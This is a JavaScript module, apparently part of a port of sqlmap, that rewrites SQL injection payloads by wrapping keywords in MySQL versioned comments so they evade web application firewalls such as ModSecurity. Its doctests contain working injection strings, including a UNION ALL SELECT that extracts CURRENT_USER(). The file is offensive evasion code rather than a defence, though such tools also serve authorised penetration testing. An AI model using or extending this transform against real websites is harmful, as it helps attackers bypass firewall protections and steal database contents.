// 上游形态变体（T-6，对标 sqlmap 1.10.10 versionedmorekeywords.py）：贴字无空格 `/*!KEYWORD*/`，
// 与 versionedkeywordsnospace 的差别在覆盖面——上游本件的词边界是「非词字符」⇒ 函数调用
// （CONCAT( / CHAR(592…)）也被包裹，但排除 IGNORE_SPACE_AFFECTED_KEYWORDS（CAST( 在上游
// doctest 里不被包裹正是这条排除集的作用）。关键词面取 upstreamKeywords.js 真值。
// 是否替换 versionedmorekeywords 默认，由 modsec-live 真机 A/B 定 ⇒ 本件不动默认链（批次 D13）。
import { SQL92_KEYWORDS, IGNORE_SPACE_AFFECTED_KEYWORDS } from '../upstreamKeywords.js';

export const versionedmorekeywordsnospace = {
  name: 'versionedmorekeywordsnospace',
  description: '将关键词（含函数名，排除 IGNORE SPACE 敏感集）用 /*!KEYWORD*/ 贴字包裹（上游形态）',
  doctests: [
    {
      input: '1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#',
      output: '1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#',
    },
    {
      // 句尾边界回归（2026-10-09）：关键词落在 payload 最后一个字符时也必须被包裹
      input: "1' UNION ALL SELECT USER",
      output: "1'/*!UNION*//*!ALL*//*!SELECT*//*!USER*/",
    },
  ],
  dbms: ['MySQL'], // [P1-FIX] 方言限定：异构库下无效，运行时告警
  /**
   * @param {string} payload
   * @returns {string}
   */
  transform(payload) {
    const out = String(payload ?? '').replace(
      // 上游 Python 原文写 `\Z`（串尾），JS 里 `\Z` 是**字面量 Z** ⇒ 句尾关键词永不加前缀。
      // 边界要的是串尾，JS 对应 `$`。
      /(?:^|(?<=\W))([A-Za-z_]+)(?=\W|$)/g,
      (word) => {
        const up = word.toUpperCase();
        return (SQL92_KEYWORDS.has(up) && !IGNORE_SPACE_AFFECTED_KEYWORDS.has(up)) ? `/*!${word}*/` : word;
      }
    );
    return out.replace(/ \/\*!/g, '/*!').replace(/\*\/ /g, '*/');
  },
};

export default versionedmorekeywordsnospace;
